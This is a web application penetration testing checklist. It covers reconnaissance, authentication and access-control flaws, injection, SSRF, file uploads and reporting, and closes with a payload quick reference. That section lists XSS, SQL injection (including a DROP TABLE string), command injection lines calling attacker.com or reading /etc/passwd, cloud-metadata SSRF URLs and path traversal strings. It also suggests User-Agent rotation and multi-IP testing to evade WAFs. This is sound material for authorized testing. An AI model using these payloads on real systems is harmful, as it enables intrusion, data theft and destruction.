# Web Application Penetration Testing Checklist

## Information Gathering & Reconnaissance

### Passive Reconnaissance
- [ ] Identify web server, technologies, and frameworks (Wappalyzer, BuiltWith)
- [ ] Enumerate subdomains (Subfinder, Amass, crt.sh)
- [ ] Search for exposed credentials (GitHub, Pastebin, Trello)
- [ ] Review historical data (Wayback Machine, archive.org)
- [ ] Gather email addresses and employee information (Hunter.io, LinkedIn)
- [ ] Check for exposed API documentation (Swagger, GraphQL introspection)
- [ ] Identify CDN usage and origin server exposure
- [ ] Review robots.txt, sitemap.xml, security.txt

### Active Reconnaissance
- [ ] Port scanning (common: 80, 443, 8080, 8443, 3000, 5000)
- [ ] Service version detection
- [ ] SSL/TLS certificate analysis
- [ ] DNS enumeration (A, AAAA, MX, TXT, CNAME records)
- [ ] Directory and file brute-forcing (common paths, backup files)
- [ ] Virtual host discovery
- [ ] WAF/CDN detection (Cloudflare, Akamai, AWS WAF)
- [ ] JavaScript file analysis for endpoints and API keys

---

## Authentication & Session Management

### Authentication Bypass
- [ ] Default credentials (admin/admin, admin/password, root/root)
- [ ] SQL injection in login forms
- [ ] NoSQL injection in authentication
- [ ] LDAP injection
- [ ] XML injection in SAML authentication
- [ ] OAuth misconfiguration (redirect_uri manipulation)
- [ ] JWT vulnerabilities (none algorithm, weak secret, kid injection)
- [ ] Password reset token prediction/reuse
- [ ] Multi-factor authentication bypass
- [ ] Rate limiting on login attempts

### Session Management
- [ ] Session fixation attacks
- [ ] Session token in URL (GET parameters)
- [ ] Predictable session tokens
- [ ] Session timeout testing
- [ ] Concurrent session handling
- [ ] Cookie security flags (Secure, HttpOnly, SameSite)
- [ ] Session invalidation on logout
- [ ] Cross-site request forgery (CSRF) token validation
- [ ] Session hijacking via XSS

### Password Policy
- [ ] Weak password requirements
- [ ] Password complexity enforcement
- [ ] Password history (reuse prevention)
- [ ] Account lockout mechanism
- [ ] Brute-force protection
- [ ] Password change without current password
- [ ] Plaintext password in responses/errors

---

## Authorization & Access Control

### Vertical Privilege Escalation
- [ ] Admin panel access without authentication
- [ ] Role-based access control bypass
- [ ] Parameter manipulation (isAdmin=true, role=admin)
- [ ] HTTP method manipulation (POST to GET, PUT to PATCH)
- [ ] Missing function-level access control
- [ ] API endpoint authorization checks

### Horizontal Privilege Escalation (IDOR)
- [ ] User ID manipulation in URLs (/user/123 → /user/124)
- [ ] Account ID in API requests
- [ ] Order ID, invoice ID, document ID manipulation
- [ ] File download/upload IDOR
- [ ] Profile picture/avatar IDOR
- [ ] Email/notification IDOR
- [ ] GUIDs/UUIDs that are predictable or enumerable
- [ ] Encoded IDs (base64, hex) that can be decoded and changed

### Path Traversal
- [ ] Directory traversal in file operations (../../../etc/passwd)
- [ ] Null byte injection (%00)
- [ ] Double encoding (%252e%252e%252f)
- [ ] Unicode/UTF-8 encoding bypass
- [ ] Absolute path manipulation (/etc/passwd)
- [ ] Windows-specific traversal (..\..\..\..\windows\system32)

---

## Input Validation & Injection Attacks

### Cross-Site Scripting (XSS)
- [ ] Reflected XSS in search parameters
- [ ] Stored XSS in user profiles, comments, forums
- [ ] DOM-based XSS via JavaScript manipulation
- [ ] XSS in file upload (SVG, HTML files)
- [ ] XSS in PDF generation
- [ ] XSS in rich text editors
- [ ] Filter bypass: `<img src=x onerror=alert(1)>`
- [ ] Event handler injection: `<body onload=alert(1)>`
- [ ] JavaScript protocol: `<a href="javascript:alert(1)">`
- [ ] Mutation XSS (mXSS) in HTML sanitizers

### SQL Injection
- [ ] Error-based SQLi (UNION, ORDER BY)
- [ ] Blind SQLi (time-based, boolean-based)
- [ ] Second-order SQLi (stored and executed later)
- [ ] SQLi in login forms (username/password)
- [ ] SQLi in search functionality
- [ ] SQLi in sorting/filtering parameters
- [ ] SQLi in JSON/XML inputs
- [ ] NoSQL injection (MongoDB, CouchDB)
- [ ] ORM injection (Hibernate, Sequelize)

### Command Injection
- [ ] OS command injection via input fields
- [ ] Blind command injection (time-based detection)
- [ ] Command chaining (;, &&, ||, |)
- [ ] Command substitution ($(), ``)
- [ ] Filter bypass with encoding/special characters
- [ ] Injection in file operations (ping, nslookup, curl)

### XML-Based Attacks
- [ ] XML External Entity (XXE) injection
- [ ] Blind XXE via out-of-band techniques
- [ ] XXE in file upload (DOCX, XLSX, SVG)
- [ ] SOAP injection
- [ ] XPath injection
- [ ] XML bomb (billion laughs attack)

### Server-Side Request Forgery (SSRF)
- [ ] Internal network scanning via SSRF
- [ ] Cloud metadata access (AWS: 169.254.169.254)
- [ ] Localhost/127.0.0.1 access
- [ ] DNS rebinding attacks
- [ ] Filter bypass (decimal IP, hex IP, shorthand IP)
- [ ] Protocol smuggling (gopher://, file://, dict://)
- [ ] SSRF in webhooks, image processing, URL fetchers

### Template Injection
- [ ] Server-Side Template Injection (SSTI)
- [ ] Client-Side Template Injection (CSTI)
- [ ] Test payloads: {{7*7}}, ${7*7}, <%= 7*7 %>
- [ ] Framework-specific: Jinja2, Twig, Freemarker, Velocity

### LDAP Injection
- [ ] Authentication bypass via LDAP injection
- [ ] LDAP filter manipulation
- [ ] Blind LDAP injection

---

## Business Logic Vulnerabilities

### Price Manipulation
- [ ] Negative prices (-100)
- [ ] Zero price (0)
- [ ] Decimal manipulation (0.01)
- [ ] Currency manipulation
- [ ] Discount code abuse
- [ ] Tax/shipping cost manipulation

### Workflow Bypass
- [ ] Skip payment steps in checkout
- [ ] Skip email verification
- [ ] Skip multi-step approval processes
- [ ] Direct access to confirmation pages
- [ ] Status manipulation (pending → approved)

### Race Conditions
- [ ] Concurrent coupon redemption
- [ ] Double withdrawal/spending
- [ ] Parallel account creation with same email
- [ ] Simultaneous purchase of limited items
- [ ] Token reuse in parallel requests

### Quantity/Limit Bypass
- [ ] Purchase more than available stock
- [ ] Exceed withdrawal limits
- [ ] Bypass rate limiting via distributed requests
- [ ] Upload oversized files
- [ ] Create unlimited accounts

### Time Manipulation
- [ ] Extend trial periods
- [ ] Bypass subscription expiration
- [ ] Manipulate timestamps in requests
- [ ] Timezone-based logic flaws

---

## File Upload Vulnerabilities

### File Type Validation
- [ ] Upload executable files (PHP, JSP, ASPX)
- [ ] Double extension bypass (shell.php.jpg)
- [ ] Null byte injection (shell.php%00.jpg)
- [ ] MIME type manipulation
- [ ] Magic byte manipulation (file signature)
- [ ] Case sensitivity bypass (shell.PhP)
- [ ] Whitespace/special characters in extension

### File Content Attacks
- [ ] Upload web shells (c99, r57, b374k)
- [ ] SVG with embedded JavaScript
- [ ] HTML files with XSS payloads
- [ ] XXE in XML-based files (DOCX, XLSX)
- [ ] Polyglot files (valid image + valid script)
- [ ] Archive bombs (zip bombs, tar bombs)

### File Storage Issues
- [ ] Predictable file paths/URLs
- [ ] Directory traversal in filename
- [ ] Overwrite critical files
- [ ] Unrestricted file size
- [ ] Files not deleted after use

---

## API Security

### REST API Testing
- [ ] Missing authentication on endpoints
- [ ] Excessive data exposure in responses
- [ ] Mass assignment vulnerabilities
- [ ] API versioning issues (v1 vs v2 access)
- [ ] HTTP method manipulation (GET → POST → DELETE)
- [ ] Content-Type manipulation (JSON → XML)
- [ ] Parameter pollution
- [ ] GraphQL introspection enabled
- [ ] GraphQL batching attacks
- [ ] GraphQL depth/complexity limits

### API Key Security
- [ ] Hardcoded API keys in JavaScript
- [ ] API keys in Git repositories
- [ ] API key rotation not enforced
- [ ] API key with excessive permissions
- [ ] API key in URL parameters (logged)

---

## Client-Side Vulnerabilities

### DOM-Based Attacks
- [ ] DOM XSS via location.hash, document.referrer
- [ ] JavaScript prototype pollution
- [ ] localStorage/sessionStorage manipulation
- [ ] postMessage vulnerabilities
- [ ] Client-side validation bypass

### CORS Misconfiguration
- [ ] Wildcard CORS policy (Access-Control-Allow-Origin: *)
- [ ] Null origin allowed
- [ ] Reflected origin in ACAO header
- [ ] Missing CORS preflight checks
- [ ] Credentials exposed via CORS

### WebSocket Security
- [ ] Missing authentication on WebSocket connections
- [ ] Cross-Site WebSocket Hijacking (CSWSH)
- [ ] Message injection/manipulation
- [ ] Rate limiting on WebSocket messages

---

## Cryptography & Data Protection

### SSL/TLS Issues
- [ ] Weak cipher suites (RC4, DES, 3DES)
- [ ] SSL/TLS version vulnerabilities (SSLv2, SSLv3, TLS 1.0)
- [ ] Certificate validation issues
- [ ] Self-signed certificates in production
- [ ] Mixed content (HTTP on HTTPS page)
- [ ] HTTP Strict Transport Security (HSTS) missing

### Data Encryption
- [ ] Sensitive data in cleartext (passwords, credit cards)
- [ ] Weak hashing algorithms (MD5, SHA1)
- [ ] Hardcoded encryption keys
- [ ] Insufficient key length
- [ ] Data exposure in logs/error messages
- [ ] PII in URL parameters or GET requests

---

## Server & Infrastructure

### Server Misconfiguration
- [ ] Directory listing enabled
- [ ] Backup files accessible (.bak, .old, .zip)
- [ ] Source code disclosure (.git, .svn, .DS_Store)
- [ ] Debug mode enabled in production
- [ ] Verbose error messages with stack traces
- [ ] Default pages (Apache, Tomcat, IIS)
- [ ] Admin consoles exposed (phpMyAdmin, Jenkins)

### HTTP Security Headers
- [ ] Missing X-Frame-Options (Clickjacking)
- [ ] Missing Content-Security-Policy
- [ ] Missing X-Content-Type-Options (MIME sniffing)
- [ ] Missing X-XSS-Protection
- [ ] Missing Referrer-Policy
- [ ] Permissive Permissions-Policy

### Rate Limiting & DoS
- [ ] No rate limiting on login
- [ ] No rate limiting on API endpoints
- [ ] No CAPTCHA on forms
- [ ] Resource exhaustion via file upload
- [ ] Regex DoS (ReDoS)
- [ ] Application-level DoS

---

## Mobile & Legacy Applications

### Legacy Application Specific
- [ ] SQL Server xp_cmdshell enabled
- [ ] Oracle SQL injection via PL/SQL
- [ ] SOAP service vulnerabilities
- [ ] ActiveX control vulnerabilities
- [ ] Flash-based XSS (if Flash still present)
- [ ] Java applet security issues
- [ ] Outdated frameworks (Struts, Spring)
- [ ] EOL software/libraries

### Mobile-Specific
- [ ] Insecure data storage (SharedPreferences, SQLite)
- [ ] Weak SSL pinning or missing
- [ ] Hardcoded secrets in APK/IPA
- [ ] Insecure deep links
- [ ] Android intent vulnerabilities
- [ ] iOS URL scheme hijacking

---

## Third-Party & Supply Chain

### Dependency Vulnerabilities
- [ ] Outdated libraries with known CVEs
- [ ] Vulnerable npm/PyPI packages
- [ ] Malicious dependencies
- [ ] Transitive dependency issues
- [ ] Abandoned/unmaintained packages

### Third-Party Services
- [ ] CDN compromise/poisoning
- [ ] Google Analytics/Tag Manager XSS
- [ ] Third-party script injection
- [ ] OAuth integration vulnerabilities
- [ ] Payment gateway misconfigurations
- [ ] Cloud storage bucket exposure (S3, Azure Blob)

---

## Post-Exploitation & Evidence Collection

### Data Extraction
- [ ] Extract database contents
- [ ] Download sensitive files
- [ ] Enumerate users/accounts
- [ ] Access admin functionality
- [ ] Export customer data

### Evidence Collection
- [ ] HTTP request/response logs (PRIMARY evidence)
- [ ] Tool output and error messages
- [ ] Screenshot ONLY when visual proof essential (XSS popup, admin panel, privilege escalation)
- [ ] Video proof of concept (for complex exploits)
- [ ] Clear, reproducible steps
- [ ] Impact assessment
- [ ] Remediation recommendations

---

## HackerOne Top Vulnerability Patterns

### Most Reported Vulnerabilities (2024-2025)
1. **IDOR** - Insecure Direct Object References
   - User ID, order ID, file ID manipulation
   - UUID enumeration
   - Sequential ID exploitation

2. **XSS** - Cross-Site Scripting
   - Reflected XSS in search/error pages
   - Stored XSS in user-generated content
   - DOM XSS via client-side frameworks

3. **SSRF** - Server-Side Request Forgery
   - Cloud metadata access (AWS, GCP, Azure)
   - Internal network scanning
   - Webhook manipulation

4. **SQL Injection**
   - Authentication bypass
   - Data exfiltration
   - Second-order injection

5. **Authentication Bypass**
   - JWT vulnerabilities
   - OAuth misconfiguration
   - 2FA bypass

6. **Improper Access Control**
   - Missing authorization checks
   - Role-based access bypass
   - Function-level access control

7. **Information Disclosure**
   - Sensitive data exposure
   - Stack traces in errors
   - API data leakage

8. **CSRF** - Cross-Site Request Forgery
   - Account takeover
   - State-changing operations
   - Missing CSRF tokens

9. **Open Redirect**
   - Phishing attacks
   - OAuth token theft
   - SSRF chain

10. **Subdomain Takeover**
    - Unclaimed DNS records
    - Dangling CNAME/A records
    - Cloud service misconfigurations

---

## Automation Recommendations

### Tools for Efficient Testing
- **Subdomain Enumeration**: Subfinder, Amass, Assetfinder
- **Directory Brute-Forcing**: ffuf, gobuster, dirsearch
- **Vulnerability Scanning**: Nuclei, Nikto, ZAP
- **SQL Injection**: sqlmap, NoSQLMap
- **XSS Detection**: XSStrike, dalfox
- **SSRF Testing**: SSRFmap, Gopherus
- **JWT Analysis**: jwt_tool, jwtcat
- **API Testing**: Postman, Burp Suite, ffuf

### Rate Limiting Strategy
- Random delays between requests (1-5 seconds)
- User-Agent rotation (10+ different UAs)
- Smart backoff on WAF detection (10-30 seconds)
- Distributed testing from multiple IPs
- Respect robots.txt and scope boundaries

---

## Testing Methodology

### 1. Reconnaissance Phase
- Gather all possible information passively
- Map attack surface (subdomains, endpoints, technologies)
- Identify entry points and interesting functionality

### 2. Vulnerability Identification
- Test each category systematically
- Use automated scanners for initial sweep
- Manual verification of findings

### 3. Exploitation
- Develop proof-of-concept exploits
- Chain vulnerabilities for higher impact
- Document all steps clearly

### 4. Post-Exploitation
- Assess actual impact
- Extract evidence
- Clean up test artifacts

### 5. Reporting
- Clear title and description
- Reproducible steps
- Evidence (screenshots, videos, logs)
- Impact assessment (CVSS score)
- Remediation recommendations

---

## Compliance & Best Practices

### Authorization
- [ ] Written permission to test
- [ ] Scope clearly defined
- [ ] Rules of engagement agreed
- [ ] Emergency contact information
- [ ] Non-disclosure agreement if needed

### Ethical Guidelines
- [ ] Do not access more data than necessary
- [ ] Do not modify/delete production data
- [ ] Do not perform destructive tests
- [ ] Report vulnerabilities responsibly
- [ ] Respect rate limits and system resources
- [ ] Stop testing if critical issue found

### Documentation
- [ ] Maintain detailed test logs
- [ ] Record all requests/responses
- [ ] Time-stamped evidence
- [ ] Version control for scripts/payloads
- [ ] Clear chain of custody for findings

---

## Quick Reference: Common Payloads

### XSS
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

### SQL Injection
```sql
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' AND 1=2 UNION SELECT username,password FROM users--
'; DROP TABLE users--
```

### Command Injection
```bash
; ls -la
| whoami
& ping -c 10 attacker.com
`cat /etc/passwd`
$(curl http://attacker.com)
```

### SSRF
```
http://127.0.0.1:80
http://localhost:8080
http://169.254.169.254/latest/meta-data/
http://[::1]:80
http://2130706433 (decimal for 127.0.0.1)
```

### Path Traversal
```
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd
```

---

**Remember**: This checklist is for authorized security testing only. Always obtain proper permission before testing any system you don't own.
